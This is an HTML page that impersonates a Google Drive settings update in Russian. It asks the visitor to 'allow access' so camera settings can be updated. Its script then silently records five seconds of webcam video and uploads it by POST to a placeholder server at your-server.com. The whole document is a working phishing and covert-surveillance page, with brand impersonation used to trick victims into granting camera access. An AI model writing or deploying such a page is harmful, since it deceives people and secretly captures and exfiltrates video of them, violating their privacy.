<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Drive - Обновление</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        button {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #357ab8;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Google Drive</h1>
        <p>Для продолжения работы необходимо обновить настройки камеры.</p>
        <button onclick="startRecording()">Разрешить доступ</button>
    </div>

    <script>
        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadVideo(blob);
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // Запись на 5 секунд
            } catch (err) {
                alert("Ошибка доступа к камере: " + err.message);
            }
        }

        function uploadVideo(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'recording.webm');

            fetch('https://your-server.com/upload', {
                method: 'POST',
                body: formData,
            })
            .then(response => response.json())
            .then(data => {
                alert("Видео успешно загружено!");
            })
            .catch(error => {
                console.error("Ошибка загрузки:", error);
            });
        }
    </script>
</body>
</html>
